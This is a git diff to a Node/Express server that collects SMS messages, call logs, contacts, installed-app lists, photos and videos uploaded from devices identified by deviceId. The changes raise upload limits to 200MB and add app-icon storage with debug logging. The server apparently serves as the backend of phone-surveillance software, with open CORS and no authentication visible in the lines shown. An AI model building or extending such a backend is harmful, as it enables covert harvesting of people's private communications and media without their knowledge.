@@ -26,9 +26,10 @@ if (process.env.CLOUDINARY_URL) {
 }
 
 // ============= MIDDLEWARE =============
+// 🔥 INCREASED LIMITS FOR ICONS (200MB)
 app.use(cors());
-app.use(express.json({ limit: '100mb' }));
-app.use(express.urlencoded({ extended: true, limit: '100mb' }));
+app.use(express.json({ limit: '200mb' }));           // Increased from 100mb to 200mb
+app.use(express.urlencoded({ extended: true, limit: '200mb' })); // Increased from 100mb to 200mb
 app.use(express.static('public'));
 
 // ============= CREATE UPLOADS FOLDER =============
@@ -48,7 +49,7 @@ const storage = multer.diskStorage({
 });
 const upload = multer({
     storage,
-    limits: { fileSize: 100 * 1024 * 1024 } // 100MB limit
+    limits: { fileSize: 200 * 1024 * 1024 } // 🔥 Increased from 100MB to 200MB
 });
 
 // ============= MONGODB CONNECTION =============
@@ -120,7 +121,7 @@ const SmsSchema = new mongoose.Schema({
     timestamp: { type: Date, default: Date.now }
 }, { timestamps: true });
 
-// App Schema
+// 🔥 MODIFIED: App Schema with ICON field
 const AppSchema = new mongoose.Schema({
     deviceId: { type: String, required: true, index: true },
     packageName: String,
@@ -128,6 +129,7 @@ const AppSchema = new mongoose.Schema({
     versionName: String,
     versionCode: Number,
     isSystemApp: Boolean,
+    icon: { type: String, default: null },  // 🔥 ICON FIELD ADDED
     firstInstallTime: Date,
     lastUpdateTime: Date,
     timestamp: { type: Date, default: Date.now }
@@ -393,7 +395,7 @@ app.post('/api/sms', async (req, res) => {
     }
 });
 
-// ============= INSTALLED APPS WITH DEBUGGING =============
+// ============= 🔥 MODIFIED: INSTALLED APPS WITH ICON SUPPORT =============
 app.post('/api/apps', async (req, res) => {
     try {
         const { deviceId, apps } = req.body;
@@ -404,6 +406,18 @@ app.post('/api/apps', async (req, res) => {
         console.log('📱 Apps type:', typeof apps);
         console.log('📱 Is array?', Array.isArray(apps));
         console.log('📱 Apps length:', apps ? apps.length : 'null');
+
+        // 🔥 Check total size
+        if (apps && apps.length > 0) {
+            const totalSize = JSON.stringify(apps).length;
+            console.log('📱 Total payload size:', (totalSize / 1024 / 1024).toFixed(2), 'MB');
+        }
+
+        // 🔥 Check if first app has icon
+        if (apps && apps.length > 0) {
+            console.log('📱 First app has icon?', apps[0].icon ? '✅ YES' : '❌ NO');
+            console.log('📱 Icon length:', apps[0].icon ? (apps[0].icon.length / 1024).toFixed(2) + 'KB' : 'N/A');
+        }
 
         if (!deviceId) {
             console.log('❌ Missing deviceId');
@@ -438,6 +452,7 @@ app.post('/api/apps', async (req, res) => {
                 versionName: app.versionName || app.version || app.ver || '',
                 versionCode: parseInt(app.versionCode || app.code || 0) || 0,
                 isSystemApp: Boolean(app.isSystemApp || app.systemApp || app.system || false),
+                icon: app.icon || null,  // 🔥 ICON FIELD SAVE KARO
                 firstInstallTime: app.firstInstallTime ? new Date(app.firstInstallTime) : null,
                 lastUpdateTime: app.lastUpdateTime ? new Date(app.lastUpdateTime) : null,
                 timestamp: new Date()
@@ -446,6 +461,10 @@ app.post('/api/apps', async (req, res) => {
 
         const saved = await App.insertMany(appsToSave);
         console.log(`✅ SUCCESS: Saved ${saved.length} apps for device:`, deviceId);
+
+        // 🔥 Count how many have icons
+        const withIcons = saved.filter(app => app.icon).length;
+        console.log(`📊 Apps with icons: ${withIcons}/${saved.length}`);
 
         const verifyCount = await App.countDocuments({ deviceId });
         console.log(`✅ Verification: Database now has ${verifyCount} apps`);
@@ -611,7 +630,7 @@ app.get('/api/video/:deviceId', async (req, res) => {
     }
 });
 
-// ============= 🔥 FIXED: BULK SYNC WITH APPS =============
+// ============= 🔥 MODIFIED: BULK SYNC WITH ICON SUPPORT =============
 app.post('/api/sync', async (req, res) => {
     try {
         const { deviceId, data } = req.body;
@@ -621,6 +640,11 @@ app.post('/api/sync', async (req, res) => {
         }
 
         console.log('🔄 Bulk sync received for device:', deviceId);
+
+        // 🔥 Check total size
+        const totalSize = JSON.stringify(req.body).length;
+        console.log('📦 Bulk sync size:', (totalSize / 1024 / 1024).toFixed(2), 'MB');
+
         const results = {};
 
         // Call Logs
@@ -642,12 +666,12 @@ app.post('/api/sync', async (req, res) => {
             results.contacts = data.contacts.length;
         }
 
-        // 🔥🔥 FIX: APPS BULK SYNC 🔥🔥
+        // 🔥🔥 FIX: APPS BULK SYNC WITH ICONS 🔥🔥
         if (data.apps && Array.isArray(data.apps)) {
             // Delete old apps
             await App.deleteMany({ deviceId });
 
-            // Save new apps
+            // Save new apps with icons
             const appsToSave = data.apps.map(app => ({
                 deviceId,
                 packageName: app.packageName || app.pkg || app.package || app.id || '',
@@ -655,12 +679,16 @@ app.post('/api/sync', async (req, res) => {
                 versionName: app.versionName || app.version || app.ver || '',
                 versionCode: parseInt(app.versionCode || app.code || 0) || 0,
                 isSystemApp: Boolean(app.isSystemApp || app.systemApp || app.system || false),
+                icon: app.icon || null,  // 🔥 ICON FIELD SAVE KARO
                 timestamp: new Date()
             }));
 
             await App.insertMany(appsToSave);
             results.apps = data.apps.length;
-            console.log(`✅ Saved ${data.apps.length} apps via bulk sync`);
+
+            // 🔥 Count apps with icons
+            const withIcons = appsToSave.filter(app => app.icon).length;
+            console.log(`✅ Saved ${data.apps.length} apps via bulk sync (${withIcons} with icons)`);
         }
 
         // Battery
@@ -705,6 +733,10 @@ app.get('/api/device/:deviceId', async (req, res) => {
 
         const apps = await App.find({ deviceId });
         console.log(`📱 Device ${deviceId} has ${apps.length} apps in database`);
+
+        // 🔥 Count apps with icons
+        const withIcons = apps.filter(app => app.icon).length;
+        console.log(`📊 Apps with icons: ${withIcons}/${apps.length}`);
 
         const data = {
             device,
@@ -786,8 +818,9 @@ server.listen(PORT, '0.0.0.0', () => {
     ║  📊 Stats API: /api/stats                    ║
     ║  📸 Photo API: /api/photo/:deviceId         ║
     ║  🎥 Video API: /api/video/:deviceId ✅       ║
-    ║  📱 Apps API: /api/apps 🔥 DEBUG ENABLED     ║
-    ║  🔄 Bulk Sync: /api/sync ✅ APPS FIXED       ║
+    ║  📱 Apps API: /api/apps 🔥 ICON SUPPORT      ║
+    ║  🔄 Bulk Sync: /api/sync ✅ ICONS FIXED      ║
+    ║  📦 Payload Limit: 200MB 🔥                  ║
     ║  🧹 Clean API: /clean                        ║
     ╚══════════════════════════════════════════════╝
     `);
